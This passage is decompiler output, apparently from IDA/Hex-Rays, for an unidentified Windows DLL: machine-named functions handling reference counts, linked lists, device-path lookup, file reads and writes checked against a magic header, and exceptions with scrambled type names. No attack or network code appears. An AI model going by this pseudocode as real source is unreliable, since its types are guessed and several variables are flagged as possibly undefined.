      sub_10007D7A(v14);
      LOBYTE(v16) = 0;
      sub_1000D3AD(v13);
      return 1;
    }
    sub_10021F56(v6, (int)v14[0]);
  }
  LOBYTE(v16) = 5;
  sub_10007D7A(v14);
  LOBYTE(v16) = 0;
  sub_1000D3AD(v13);
  return 0;
}
// 10034BCB: variable 'v3' is possibly undefined
// 10034BE8: variable 'v5' is possibly undefined
// 10034C28: variable 'v6' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;
// 10034B52: using guessed type int var_3C[5];

//----- (10034C6A) --------------------------------------------------------
_DWORD *__thiscall sub_10034C6A(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  LONG *v4; // eax
  LONG *v6; // edi
  WCHAR *v7; // ebx
  LONG *v8; // eax
  _DWORD *v9; // eax
  int v10; // eax
  int v11[2]; // [esp+10h] [ebp-2Ch] BYREF
  int v12; // [esp+18h] [ebp-24h] BYREF
  int v13[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v14[2]; // [esp+24h] [ebp-18h] BYREF
  int v15; // [esp+2Ch] [ebp-10h]
  int v16; // [esp+38h] [ebp-4h]

  v15 = 0;
  if ( sub_10034B52(this) )
  {
    v3 = sub_100513C8(v14, (int)this + 20);
    v16 = 1;
    v4 = sub_10051163(v11, (int)v3);
    LOBYTE(v16) = 2;
    sub_10051459(v4, a2);
    v15 = 1;
    LOBYTE(v16) = 1;
    sub_100511C9(v11);
  }
  else
  {
    if ( !sub_10034A02(this) )
    {
      v10 = sub_1000E950((int)v13);
      v16 = 6;
      sub_10007DD5(v10, 290);
    }
    sub_1000D1D6(v14, 0x104u);
    v16 = 3;
    v6 = sub_1000D836(2, (int)this + 20, v13, 0);
    LOBYTE(v16) = 4;
    sub_1000D4A1(v14);
    v7 = *(WCHAR **)(v14[1] + 12);
    v8 = sub_1000D9B4(v6);
    LOBYTE(v7) = QueryDosDeviceW(*(LPCWSTR *)(v8[1] + 12), v7, 0x104u) == 0;
    LOBYTE(v16) = 3;
    sub_1000D3AD(v13);
    if ( (_BYTE)v7 )
    {
      v9 = sub_1000E9DF(&v12, 1, 1);
      LOBYTE(v16) = 5;
      sub_1000A947(v9, 283);
    }
    sub_1000D372(a2, (int)v14);
    v15 = 1;
  }
  LOBYTE(v16) = 0;
  sub_1000D3AD(v14);
  return a2;
}

//----- (10034D9E) --------------------------------------------------------
void __thiscall sub_10034D9E(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_10103750;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[12];
    sub_10034F6A(i);
  }
  sub_10039F05(this);
}
// 10103750: using guessed type int (__thiscall *off_10103750)(void *Block, char);

//----- (10034DF5) --------------------------------------------------------
_DWORD *__thiscall sub_10034DF5(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103790;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103790: using guessed type int (__thiscall *off_10103790)(void *Block, char);

//----- (10034E51) --------------------------------------------------------
_DWORD *__thiscall sub_10034E51(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103790;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103790: using guessed type int (__thiscall *off_10103790)(void *Block, char);

//----- (10034EAD) --------------------------------------------------------
int *__thiscall sub_10034EAD(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( a3 )
  {
    v6 = a3;
    do
    {
      sub_10042AAB(*a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}

//----- (10034F16) --------------------------------------------------------
void __thiscall sub_10034F16(void *this, int a2)
{
  void *v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1003406C(v2);
}

//----- (10034F4E) --------------------------------------------------------
_DWORD *__thiscall sub_10034F4E(_DWORD *Block, char a2)
{
  sub_10034D9E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034F6A) --------------------------------------------------------
int *__stdcall sub_10034F6A(int *Block)
{
  sub_10034F96(Block);
  j__free(Block);
  return Block;
}

//----- (10034F96) --------------------------------------------------------
void __stdcall sub_10034F96(int *a1)
{
  sub_1000D3AD(a1 + 10);
  sub_1000D3AD(a1 + 8);
  sub_1000D3AD(a1 + 6);
  sub_1000D3AD(a1 + 4);
}

//----- (10034FE0) --------------------------------------------------------
int __thiscall sub_10034FE0(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 48);
  this[3] = result;
  return result;
}

//----- (1003501A) --------------------------------------------------------
int __thiscall sub_1003501A(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 52);
  this[2] = result;
  return result;
}

//----- (10035054) --------------------------------------------------------
int *__thiscall sub_10035054(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int *result; // eax
  _DWORD v9[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 48);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 48) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 52) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10034F6A(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (100350D3) --------------------------------------------------------
_DWORD *__thiscall sub_100350D3(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[12]; // [esp-38h] [ebp-5Ch] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x38u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10035158(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100351EA(
               Block,
               v6[0],
               v6[1],
               v6[2],
               v6[3],
               v6[4],
               v6[5],
               v6[6],
               v6[7],
               v6[8],
               v6[9],
               v6[10],
               v6[11],
               v7,
               v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 48) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 52) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10035158) --------------------------------------------------------
_DWORD *__thiscall sub_10035158(_DWORD *this, _DWORD *a2)
{
  *a2 = *this;
  a2[1] = this[1];
  a2[2] = this[2];
  a2[3] = this[3];
  sub_1000D372(a2 + 4, (int)(this + 4));
  sub_1000D372(a2 + 6, (int)(this + 6));
  sub_1000D372(a2 + 8, (int)(this + 8));
  sub_1000D372(a2 + 10, (int)(this + 10));
  return a2;
}

//----- (100351EA) --------------------------------------------------------
_DWORD *__stdcall sub_100351EA(
        _DWORD *a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  sub_10035158(&a2, a1);
  a1[12] = a14;
  a1[13] = a15;
  sub_10034F96(&a2);
  return a1;
}

//----- (1003522D) --------------------------------------------------------
_DWORD *__stdcall sub_1003522D(
        _DWORD *a1,
        int a2,
        int a3,
        _DWORD *a4,
        char a5,
        _DWORD *a6,
        wchar_t *lpAddend,
        int a8,
        int a9)
{
  _DWORD *v10; // [esp+0h] [ebp-2Ch] BYREF
  wchar_t *v11; // [esp+4h] [ebp-28h]
  void *v12; // [esp+1Ch] [ebp-10h]
  int v13; // [esp+28h] [ebp-4h]

  v13 = 1;
  v12 = &v10;
  v11 = lpAddend;
  v10 = a6;
  InterlockedIncrement((volatile LONG *)lpAddend);
  LOBYTE(v13) = 1;
  sub_1004065E(a1, a2, a3, a4, a5, v10, v11);
  LOBYTE(v13) = 3;
  v11 = (wchar_t *)&a8;
  v10 = a1 + 190;
  *a1 = &off_10103248;
  sub_1000D372(v10, (int)v11);
  LOBYTE(v13) = 0;
  sub_1000780D(&a6);
  v13 = -1;
  sub_1000D3AD(&a8);
  return a1;
}
// 10103248: using guessed type int (__thiscall *off_10103248)(void *Block, char);

//----- (100352B2) --------------------------------------------------------
_DWORD *__stdcall sub_100352B2(
        _DWORD *a1,
        int a2,
        int a3,
        _DWORD *a4,
        char a5,
        int a6,
        int a7,
        _DWORD *a8,
        wchar_t *lpAddend,
        int a10,
        volatile LONG *a11)
{
  volatile LONG *v11; // ecx
  int v12; // edx
  _DWORD *v14; // [esp-8h] [ebp-34h] BYREF
  wchar_t *v15; // [esp-4h] [ebp-30h]
  int v16; // [esp+0h] [ebp-2Ch] BYREF
  volatile LONG *v17; // [esp+4h] [ebp-28h]
  void *v18; // [esp+18h] [ebp-14h]
  void *v19; // [esp+1Ch] [ebp-10h]
  int v20; // [esp+28h] [ebp-4h]

  v20 = 2;
  v19 = &v16;
  sub_1000D372(&v16, (int)&a6);
  LOBYTE(v20) = 3;
  v18 = &v14;
  v15 = lpAddend;
  v14 = a8;
  InterlockedIncrement((volatile LONG *)lpAddend);
  LOBYTE(v20) = 2;
  sub_1003522D(a1, a2, a3, a4, a5, v14, v15, v16, (int)v17);
  LOBYTE(v20) = 5;
  v11 = a11;
  v12 = a10;
  *a1 = &off_101037B0;
  v17 = v11;
  a1[193] = v11;
  a1[192] = v12;
  InterlockedIncrement(v17);
  LOBYTE(v20) = 1;
  sub_1000D3AD(&a6);
  LOBYTE(v20) = 0;
  sub_1000780D(&a8);
  v20 = -1;
  sub_1000780D(&a10);
  return a1;
}
// 101037B0: using guessed type int (__thiscall *off_101037B0)(void *Block, char);

//----- (1003535E) --------------------------------------------------------
int *__thiscall sub_1003535E(int *Block, char a2)
{
  sub_1003537A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003537A) --------------------------------------------------------
void __thiscall sub_1003537A(int *this)
{
  *this = (int)&off_101037B0;
  sub_1000780D(this + 192);
  sub_1002AC40(this);
}
// 101037B0: using guessed type int (__thiscall *off_101037B0)(void *Block, char);

//----- (100353B1) --------------------------------------------------------
void __thiscall sub_100353B1(int *this)
{
  int *v2; // ecx
  volatile LONG *v3; // edx
  int v4; // ecx
  int v5; // ecx
  _DWORD *v6; // eax
  int *v7; // [esp-8h] [ebp-3Ch] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-38h]
  void *v9; // [esp+Ch] [ebp-28h]
  int v10[6]; // [esp+10h] [ebp-24h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  v2 = this + 186;
  v3 = (volatile LONG *)v2[1];
  v7 = v2;
  v8 = v3;
  v4 = *v2;
  v9 = &v7;
  v7 = (int *)v4;
  InterlockedIncrement(v3);
  v11 = 0;
  v5 = this[192];
  v11 = -1;
  v6 = sub_10032417(v5, v10, (int)(this + 190), (int)v7, v8);
  v11 = 1;
  sub_100408B3(v6, (int)this);
  v11 = -1;
  sub_1000B3DF(v10);
}

//----- (1003544C) --------------------------------------------------------
void __thiscall sub_1003544C(_DWORD *this, char a2, int a3, int a4)
{
  _DWORD *v4; // esi
  LONG *v5; // eax
  volatile LONG *v6; // edx
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // [esp-8h] [ebp-54h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-50h]
  void *v11; // [esp+10h] [ebp-3Ch]
  int v12[5]; // [esp+14h] [ebp-38h] BYREF
  int v13[6]; // [esp+28h] [ebp-24h] BYREF
  int v14; // [esp+48h] [ebp-4h]

  v4 = this;
  v11 = this;
  sub_1000B1F3(0, (int)v12, 0);
  v14 = 0;
  if ( a2 )
  {
    v5 = (LONG *)sub_100406F2(v4, v13);
    LOBYTE(v14) = 1;
    sub_1000B3BD(v5, (int)v12);
    LOBYTE(v14) = 0;
    sub_1000B3DF(v13);
    v4 = v11;
  }
  v6 = (volatile LONG *)v4[187];
  v9 = v4 + 186;
  v10 = v6;
  v7 = v4[186];
  v11 = &v9;
  v9 = (_DWORD *)v7;
  InterlockedIncrement(v6);
  LOBYTE(v14) = 2;
  v8 = v4[192];
  LOBYTE(v14) = 0;
  sub_1003258C((int)(v4 + 190), v8, (int)v12, (int)v9, v10);
  v14 = -1;
  sub_1000B3DF(v12);
}
// 1003544C: using guessed type int var_24[6];

//----- (10035523) --------------------------------------------------------
void __noreturn sub_10035523()
{
  int v0; // eax
  char v1[16]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 49);
}
// 10035523: using guessed type char var_14[16];

//----- (10035545) --------------------------------------------------------
void __thiscall sub_10035545(_DWORD *this, int a2, int a3)
{
  if ( a3 )
  {
    if ( a3 == 4 )
      --this[178];
  }
  else
  {
    sub_10031D8B(this[192]);
  }
}

//----- (10035573) --------------------------------------------------------
_DWORD *__stdcall sub_10035573(_DWORD *a1, int a2, volatile LONG *a3, int a4, volatile LONG *lpAddend)
{
  int v6; // [esp-18h] [ebp-3Ch] BYREF
  volatile LONG *v7; // [esp-14h] [ebp-38h]
  int v8; // [esp-10h] [ebp-34h]
  int v9; // [esp-Ch] [ebp-30h] BYREF
  volatile LONG *v10; // [esp-8h] [ebp-2Ch]
  int v11; // [esp-4h] [ebp-28h]
  void *v12; // [esp+10h] [ebp-14h]
  void *v13; // [esp+14h] [ebp-10h]
  int v14; // [esp+20h] [ebp-4h]

  v14 = 1;
  v11 = 0;
  v13 = &v9;
  v10 = lpAddend;
  v9 = a4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v14) = 2;
  v8 = 0;
  v12 = &v6;
  v7 = a3;
  v6 = a2;
  InterlockedIncrement(a3);
  LOBYTE(v14) = 1;
  sub_1002E489(a1, v6, v7, v8, v9, v10, v11);
  *a1 = &off_101037D4;
  LOBYTE(v14) = 0;
  sub_1000780D(&a2);
  v14 = -1;
  sub_1000780D(&a4);
  return a1;
}
// 101037D4: using guessed type int (__thiscall *off_101037D4)(void *Block, char);

//----- (100355FB) --------------------------------------------------------
_DWORD *__thiscall sub_100355FB(_DWORD *Block, char a2)
{
  sub_10035617(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10035617) --------------------------------------------------------
void __thiscall sub_10035617(_DWORD *this)
{
  *this = &off_101037D4;
  sub_1002E517(this);
}
// 101037D4: using guessed type int (__thiscall *off_101037D4)(void *Block, char);

//----- (1003563B) --------------------------------------------------------
int __stdcall sub_1003563B(int a1)
{
  qword_10176838 += *(unsigned int *)(*(_DWORD *)a1 + 32);
  return 0;
}
// 10176838: using guessed type __int64 qword_10176838;

//----- (10035656) --------------------------------------------------------
char sub_10035656()
{
  return 120;
}

//----- (10035659) --------------------------------------------------------
int __stdcall sub_10035659(int a1, int *a2, int a3, int a4, _DWORD *a5, wchar_t *lpAddend)
{
  volatile LONG *v6; // ecx
  int v7; // ecx
  const void *v8; // eax
  void *v9; // eax
  LONG *v10; // eax
  int v12; // [esp-Ch] [ebp-7Ch] BYREF
  _DWORD *v13; // [esp-8h] [ebp-78h] BYREF
  wchar_t *v14; // [esp-4h] [ebp-74h]
  volatile LONG *v15; // [esp+0h] [ebp-70h] BYREF
  volatile LONG *v16; // [esp+4h] [ebp-6Ch]
  int v17[10]; // [esp+18h] [ebp-58h] BYREF
  int v18[5]; // [esp+40h] [ebp-30h] BYREF
  void *v19; // [esp+54h] [ebp-1Ch]
  void *v20; // [esp+58h] [ebp-18h]
  char pExceptionObject[16]; // [esp+5Ch] [ebp-14h] BYREF
  int v22; // [esp+6Ch] [ebp-4h]

  v22 = 1;
  v20 = &v15;
  sub_1000D372(&v15, (int)&a3);
  LOBYTE(v22) = 2;
  v19 = &v13;
  v14 = lpAddend;
  v13 = a5;
  InterlockedIncrement((volatile LONG *)lpAddend);
  LOBYTE(v22) = 1;
  sub_1003522D((_DWORD *)a1, 0, 0, a2, 1, v13, v14, (int)v15, (int)v16);
  LOBYTE(v22) = 4;
  *(_DWORD *)a1 = &off_1010326C;
  *(_BYTE *)(a1 + 768) = 0;
  *(_BYTE *)(a1 + 769) = 0;
  sub_1000B1F3(0, a1 + 772, 0);
  a2 = (int *)(a1 + 792);
  memset((void *)(a1 + 792), 0, 8u);
  LOBYTE(v22) = 6;
  v16 = v6;
  v15 = v6;
  v19 = &v15;
  sub_1000B964(&v15);
  LOBYTE(v22) = 6;
  sub_1000BA6E(1, 0x80000000, v17, a1 + 760, 128, 3, (int)v15, v16);
  LOBYTE(v22) = 8;
  sub_1000BBC2(v17);
  if ( !sub_10035B40(v7, v17) )
  {
    sub_1000E7F7(&a2, 1, 0);
    a2 = (int *)&off_101033F4;
    LOBYTE(v22) = 10;
    Concurrency::details::ThreadScheduler::ThreadScheduler(
      (Concurrency::details::ThreadScheduler *)pExceptionObject,
      (const struct Concurrency::SchedulerPolicy *)&a2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVAjhjdvrQnxxcNhjkrgajh_BurqUpfqufhkrx_wvnem__);
  }
  LOBYTE(v22) = 11;
  sub_10035BA0((void *)8, v17, v18, 4);
  LOBYTE(v22) = 12;
  v16 = (volatile LONG *)v18[3];
  v8 = (const void *)sub_1000B4B8(v18);
  memcpy(a2, v8, (size_t)v16);
  *(_BYTE *)(a1 + 769) = 1;
  LOBYTE(v22) = 11;
  sub_1000B3DF(v18);
  v22 = 14;
  v9 = (void *)(sub_1000C225((HANDLE *)v17) - 12);
  if ( (unsigned int)v9 >= 4 )
  {
    a2 = &v12;
    sub_10035BA0(v9, v17, &v12, 12);
    LOBYTE(v22) = 14;
    v10 = (LONG *)sub_1002FADA((int)v18, v12, (int)v13, (int)v14, (void *)v15);
    LOBYTE(v22) = 16;
    sub_1000B3BD(v10, a1 + 772);
    LOBYTE(v22) = 14;
    sub_1000B3DF(v18);
    *(_BYTE *)(a1 + 768) = 1;
  }
  v22 = 6;
  sub_1000BB54((int)v17);
  v22 = 0;
  sub_1000D3AD(&a3);
  v22 = -1;
  sub_1000780D(&a5);
  return a1;
}
// 100356F2: variable 'v6' is possibly undefined
// 10035736: variable 'v7' is possibly undefined
// 1010326C: using guessed type int (__thiscall *off_1010326C)(void *Block, char);
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);

//----- (1003589C) --------------------------------------------------------
void __thiscall sub_1003589C(_DWORD *this)
{
  sub_1000E843(this);
}

//----- (100358BA) --------------------------------------------------------
_DWORD *__thiscall sub_100358BA(_DWORD *Block, char a2)
{
  sub_1003589C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100358D6) --------------------------------------------------------
void __thiscall sub_100358D6(int this)
{
  const struct Concurrency::SchedulerPolicy *v1; // eax
  char pExceptionObject[4]; // [esp+14h] [ebp-14h] BYREF
  _DWORD v3[4]; // [esp+18h] [ebp-10h] BYREF

  if ( !*(_BYTE *)(this + 768) )
  {
    v1 = (const struct Concurrency::SchedulerPolicy *)sub_1003592A(v3);
    v3[3] = 0;
    Concurrency::details::ThreadScheduler::ThreadScheduler(
      (Concurrency::details::ThreadScheduler *)pExceptionObject,
      v1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVZwjggUslQydhlBuqridwzw_BurqUpfqufhkrx_wvnem__);
  }
  sub_100408B3((_DWORD *)(this + 772), this);
}
// 100358D6: using guessed type char pExceptionObject[4];

//----- (1003592A) --------------------------------------------------------
_DWORD *__stdcall sub_1003592A(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_101033F4;
  return a1;
}
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);

//----- (1003595C) --------------------------------------------------------
_DWORD *__thiscall sub_1003595C(int this, _DWORD *a2)
{
  const struct Concurrency::SchedulerPolicy *v2; // eax
  int v3; // edx
  _DWORD *result; // eax
  int v5; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-10h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  if ( !*(_BYTE *)(this + 769) )
  {
    v2 = (const struct Concurrency::SchedulerPolicy *)sub_1003592A(&a2);
    v7 = 0;
    Concurrency::details::ThreadScheduler::ThreadScheduler(
      (Concurrency::details::ThreadScheduler *)pExceptionObject,
      v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVZwjggUslQydhlBuqridwzw_BurqUpfqufhkrx_wvnem__);
  }
  v3 = *(_DWORD *)(this + 792);
  result = a2;
  v5 = *(_DWORD *)(this + 796);
  *a2 = v3;
  result[1] = v5;
  return result;
}

//----- (100359B8) --------------------------------------------------------
int __thiscall sub_100359B8(_DWORD *this, char a2, char a3, int a4)
{
  void *v5; // eax
  volatile LONG *v6; // ecx
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // eax
  void *v10; // eax
  int v12[3]; // [esp-14h] [ebp-68h] BYREF
  volatile LONG *v13; // [esp-8h] [ebp-5Ch] BYREF
  volatile LONG *v14; // [esp-4h] [ebp-58h]
  void *Block; // [esp+10h] [ebp-44h]
  _DWORD *v16; // [esp+14h] [ebp-40h]
  void *v17; // [esp+18h] [ebp-3Ch]
  _BYTE v18[8]; // [esp+1Ch] [ebp-38h] BYREF
  int v19; // [esp+24h] [ebp-30h]
  int v20[6]; // [esp+30h] [ebp-24h] BYREF
  int v21; // [esp+50h] [ebp-4h]

  v16 = this;
  v5 = operator new(0x28u);
  v6 = v14;
  Block = v5;
  v7 = 0;
  v21 = 0;
  if ( Block )
  {
    v13 = v14;
    v17 = &v13;
    sub_1000B964(&v13);
    LOBYTE(v21) = 0;
    v7 = sub_1000BA6E(1, 0x40000000, Block, (int)(this + 190), 128, 2, (int)v13, v14);
  }
  v21 = -1;
  v14 = v6;
  v13 = v6;
  v17 = &v13;
  sub_10050B91(&v13, (int)v7);
  v21 = -1;
  sub_10051829((int)v18, (int)v13, v14);
  v21 = 3;
  v8 = sub_1000B1F3((void *)4, (int)v20, &unk_10103234);
  LOBYTE(v21) = 4;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v19 + 56))(v19, v8);
  LOBYTE(v21) = 3;
  sub_1000B3DF(v20);
  v9 = sub_1000B1F3((void *)8, (int)v20, &a3);
  LOBYTE(v21) = 5;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v19 + 56))(v19, v9);
  LOBYTE(v21) = 3;
  sub_1000B3DF(v20);
  if ( a2 )
  {
    v17 = v12;
    sub_100406F2(v16, v12);
    LOBYTE(v21) = 3;
    v10 = sub_1002FA5D(v20, v12[0], v12[1], v12[2], (void *)v13);
    LOBYTE(v21) = 7;
    (*(void (__thiscall **)(int, void *))(*(_DWORD *)v19 + 56))(v19, v10);
    LOBYTE(v21) = 3;
    sub_1000B3DF(v20);
  }
  sub_10051922((int)v18);
  v21 = -1;
  return sub_1005189B(v18);
}
// 10035A3E: variable 'v6' is possibly undefined
// 100359B8: using guessed type _BYTE var_38[8];
// 100359B8: using guessed type int var_24[6];

//----- (10035B40) --------------------------------------------------------
char __fastcall sub_10035B40(int a1, int *a2)
{
  int v3[8]; // [esp+14h] [ebp-24h] BYREF
  int v4; // [esp+34h] [ebp-4h]

  v4 = 0;
  sub_10035BA0((void *)4, a2, v3, 0);
  LOBYTE(v4) = 1;
  if ( sub_1000B6F2(v3, 0) == -504014309 )
  {
    LOBYTE(v4) = 0;
    sub_1000B3DF(v3);
    return 1;
  }
  else
  {
    LOBYTE(v4) = 0;
    sub_1000B3DF(v3);
    return 0;
  }
}
// 10035B40: using guessed type int var_24[8];

//----- (10035BA0) --------------------------------------------------------
void *__userpurge sub_10035BA0@<eax>(void *a1@<ecx>, int *a2@<esi>, void *a3, int a4)
{
  int v5; // eax
  _DWORD *v6; // eax
  int v8[4]; // [esp+10h] [ebp-20h] BYREF
  int v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  v9 = 0;
  (*(void (__thiscall **)(int *, int, _DWORD))(*a2 + 64))(a2, a4, 0);
  sub_1000B1F3(a1, (int)a3, 0);
  v10 = 0;
  v5 = *a2;
  v9 = 1;
  if ( a1 != (void *)(*(int (__thiscall **)(int *, void *))(v5 + 48))(a2, a3) )
  {
    v6 = sub_100145B3(v8, 1);
    v10 = 1;
    sub_1000C948(v6, 165);
  }
  return a3;
}
// 10035BA0: using guessed type int var_20[4];

//----- (10035C02) --------------------------------------------------------
int *__thiscall sub_10035C02(_DWORD *this, int *a2)
{
  unsigned int v2; // edi
  _DWORD *v3; // esi
  unsigned int v4; // eax
  int v5; // eax

  v2 = 0;
  v3 = this + 182;
  v4 = (*(int (__thiscall **)(_DWORD *))(this[182] + 4))(this + 182);
  sub_10018FD5(a2, v4);
  if ( (*(int (__thiscall **)(_DWORD *))(*v3 + 4))(v3) )
  {
    do
    {
      v5 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*v3 + 44))(v3, v2);
      sub_10007469(a2, v5 + 4);
      ++v2;
    }
    while ( v2 < (*(int (__thiscall **)(_DWORD *))(*v3 + 4))(v3) );
  }
  return a2;
}

//----- (10035C6C) --------------------------------------------------------
int __stdcall sub_10035C6C(int a1, int a2, int a3, _DWORD *a4, char a5, int a6, volatile LONG *lpAddend)
{
  int v7; // ecx
  _DWORD *v8; // eax
  volatile LONG *v10; // [esp-4h] [ebp-28h]
  int v11[4]; // [esp+10h] [ebp-14h] BYREF
  int v12; // [esp+20h] [ebp-4h]

  v12 = 0;
  sub_100309B0((_DWORD *)a1, a3);
  *(_DWORD *)a1 = &off_10103844;
  sub_1000809E(a4, (_DWORD *)(a1 + 56));
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  sub_1000D17D((_DWORD *)(a1 + 672), &word_1017DB80);
  sub_1000D17D((_DWORD *)(a1 + 680), &word_1017DB80);
  sub_1000D17D((_DWORD *)(a1 + 688), &word_1017DB80);
  sub_1000728E((_DWORD *)(a1 + 700), 0);
  *(_DWORD *)(a1 + 708) = a2;
  *(_DWORD *)(a1 + 712) = 0;
  *(_DWORD *)(a1 + 716) = 0;
  *(_DWORD *)(a1 + 720) = 0;
  *(_BYTE *)(a1 + 724) = a5;
  *(_BYTE *)(a1 + 725) = 0;
  *(_DWORD *)(a1 + 728) = off_100FBF5C;
  *(_DWORD *)(a1 + 728) = &off_101037E8;
  sub_10036B74((_DWORD *)(a1 + 728));
  v7 = a6;
  v10 = lpAddend;
  *(_DWORD *)(a1 + 748) = lpAddend;
  *(_DWORD *)(a1 + 744) = v7;
  InterlockedIncrement(v10);
  LOBYTE(v12) = 11;
  v8 = sub_10029C7F(*(_DWORD *)(a1 + 744), v11);
  LOBYTE(v12) = 12;
  sub_10035DB8((_DWORD *)a1, (int)v8);
  LOBYTE(v12) = 11;
  sub_1000D3AD(v11);
  v12 = -1;
  sub_1000780D(&a6);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101037E8: using guessed type int (__thiscall *off_101037E8)(void *Block, char);
// 10103844: using guessed type int (__thiscall *off_10103844)(void *Block, char);
// 10035C6C: using guessed type int var_14[4];

//----- (10035D9C) --------------------------------------------------------
void *__thiscall sub_10035D9C(void *Block, char a2)
{
  sub_10035E78((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

